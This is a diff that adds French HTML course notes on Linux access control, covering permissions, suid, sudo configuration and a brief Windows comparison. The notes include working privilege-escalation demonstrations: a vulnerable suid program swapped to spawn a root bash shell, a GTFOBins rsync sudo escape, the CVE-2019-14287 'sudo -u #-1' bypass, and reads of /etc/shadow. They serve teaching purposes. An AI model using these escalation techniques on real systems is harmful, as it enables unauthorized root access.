@@ -358,6 +358,144 @@
                             <p>Certaines fonctions administratives sont réservées à l'utilisateur "root".</p>
                         </li>
                     </ul>
+                    <h3>Contrôle d'accès aux fichiers :</h3>
+                    <img src="../images/controle_acces_fichiers.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>sudo cat /etc/group | grep site</code></pre>
+<pre><code>ls -la</code></pre>
+<pre><code>cat fichier-partage-groupe-site</code></pre>
+<pre><code>cat fichier-partage-tous</code></pre>
+                    <h3>Contrôle d'accès aux processus :</h3>
+                    <img src="../images/controle_acces_processus.PNG" alt="">
+                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
+<pre><code>ps au | grep user</code></pre>
+<pre><code>kill 1788</code></pre>
+<pre><code>kill 1875</code></pre>
+                    <h3>Actions privilégiées - root :</h3>
+                    <p>Les quelques actions privilégiées sont :</p>
+                    <ul>
+                        <li>
+                            <p>Réseau</p>
+                        </li>
+                        <li>
+                            <p>Quotas.</p>
+                        </li>
+                        <li>
+                            <p>Régler heure.</p>
+                        </li>
+                        <li>
+                            <p>Installer software de bas niveau...</p>
+                        </li>
+                    </ul>
+                    <img src="../images/actions_privilegiees_root.PNG" alt="">
+                    <p>Voici les commandes exécutées dans l'image précédente :</p>
+<pre><code>id</code></pre>
+<pre><code>cat /etc/shaddow | grep user</code></pre>
+                    <h3>suid - changement de mot de passe :</h3>
+                    <img src="../images/suid_changement_password.PNG" alt="">
+                    <p>Voici les commandes exécutées dans l'image précédente :</p>
+<pre><code>ls -la /usr/bin/passwd</code></pre>
+<pre><code>passwd</code></pre>
+                    <h3>Exploitation suid programme mal sécurisé :</h3>
+                    <p><a href="https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/" target="_blank">https://tbhaxor.com/exploiting-suid-binaries-to-get-root-user-shell/</a></p>
+                    <img src="../images/exploitation_suid_programme_mal_securise.PNG" alt="">
+                    <p>Voici les commandes exécutées dans l'image précédente :</p>
+<pre><code>ls -la</code></pre>
+<pre><code>cp greetings1 greetings</code></pre>
+<pre><code>./welcolme</code></pre>
+<pre><code>cp greetings2 greetings</code></pre>
+<pre><code>./welcome</code></pre>
+<pre><code>id</code></pre>
+                    <h4>Code :</h4>
+                    <img src="../images/exploitation_suid_programme_mal_securise_code.PNG" alt="">
+                    <p>Voici le contenu du fichier `<span class="em">welcome.c</span>` :</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+
+int main(int argc, char **argv, char **envp) {
+    int child_id = fork();
+    if (child_id == 0) {
+        char *args[] = {"./greetings", NULL};
+        execv("./greetings", args);
+    } else {
+        waitpid(child_id, NULL, 0);
+    }
+}</code></pre>
+                    <p>Voici le contenu du fichier `<span class="em">greetings1</span>` :</p>
+<pre><code>#!/bin/bash
+
+echo "Greetings!"</code></pre>
+                    <p>Voici le contenu du fichier `<span class="em">greetings.c</span>` :</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+int main (int argc, char *argv[]) {
+    char *args[] = {"/bin/bash", "-p", "-i", NULL};
+    return execv("/bin/bash", args);
+}</code></pre>
+                    <h3>Administration login root vs sudo - accès opportuniste :</h3>
+                    <h4>root vs sudo :</h4>
+                    <ul>
+                        <li>
+                            <p>root : partage du compte - pas de logging - redevabilité ?</p>
+                        </li>
+                        <li>
+                            <p>sudo : action spécifique - logging.</p>
+                        </li>
+                    </ul>
+                    <img src="../images/administration_login_root_vs_sudo_acces_opportuniste.PNG" alt="">
+<pre><code>sudo cat /etc/shadow | grep user</code></pre>
+                    <h3>Configuration sudo :</h3>
+                    <h4>Création groupe et rattachement utilisateur :</h4>
+                    <img src="../images/creation_groupe_rattachement_utilisateur.PNG" alt="">
+<pre><code>sudo groupadd admin</code></pre>
+<pre><code>sudo adduser user_adm admin</code></pre>
+                    <h4>Contenu des groupes :</h4>
+                    <img src="../images/contenu_groupes.PNG" alt="">
+<pre><code>cat /etc/group | grep sudo</code></pre>
+<pre><code>cat /etc/group | grep admin</code></pre>
+<pre><code>cat /etc/group | grep rsync_user</code></pre>
+                    <p><a href="https://www.sudo.ws/docs/man/1.7.10/sudoers.man/" target="_blank">https://www.sudo.ws/docs/man/1.7.10/sudoers.man/</a></p>
+                    <img src="../images/etc_sudoers.PNG" alt="">
+<pre><code>sudo cat /etc/sudoers</code></pre>
+                    <h3>Sécurité limitée sudo :</h3>
+                    <img src="../images/securitee_limitee_sudo_1.PNG" alt="">
+                    <p><a href="https://gtfobins.github.io/gtfobins/rsync/" target="_blank">https://gtfobins.github.io/gtfobins/rsync/</a></p>
+                    <p>Voici les commandes exécutées dans l'image précédente:</p>
+<pre><code>groups</code></pre>
+<pre><code>sudo rsync /common/hello.txt</code></pre>
+<pre><code>sudo -u user2 cat /home/user2</code></pre>
+<pre><code>sudo rsync -e 'sh -c "sh 0&lt;&amp;2 1&gt;2"' 127.0.0.1:/dev/null</code></pre>
+<pre><code>id</code></pre>
+                    <img src="../images/securitee_limitee_sudo_2.PNG" alt="">
+                    <p><a href="https://blog.sec-it.fr/en/2021/02/08/sudo-vulns/#CVE-2019-14287" target="_blank">https://blog.sec-it.fr/en/2021/02/08/sudo-vulns/#CVE-2019-14287</a></p>
+                    <p>Voici les commandes exécutées dans l'image précédente :</p>
+<pre><code>sudo -u user1 ls /home/user1</code></pre>
+<pre><code>sudo cat /etc/sudoers</code></pre>
+<pre><code>sudo -u \#-1 /bin/bash</code></pre>
+<pre><code>id</code></pre>
+                    <h3>Windows :</h3>
+                    <img src="../images/windows_1.PNG" alt="">
+                    <img src="../images/windows_2.PNG" alt="">
+                    <h4>Quelques différences :</h4>
+                    <ul>
+                        <li>
+                            <p>Windows : modèle plus riche de droits d'accès.</p>
+                        </li>
+                        <li>
+                            <p>Notion d'héritage de droits.</p>
+                        </li>
+                        <li>
+                            <p>...</p>
+                        </li>
+                        <li>
+                            <p>(voir par exemple : <a href="https://www.cs.cornell.edu/courses/cs513/2000SP/L07.html" target="_blank">https://www.cs.cornell.edu/courses/cs513/2000SP/L07.html</a> ou <a href="https://learn.microsoft.com/enus/windows/win32/ad/access-control-inheritance" target="_blank">https://learn.microsoft.com/enus/windows/win32/ad/access-control-inheritance</a>)</p>
+                        </li>
+                        <li>
+                            <p>Modèles convergent (surtout avec extensions).</p>
+                        </li>
+                    </ul>
                 </article>
             <!-- fin de section -->
             </section>
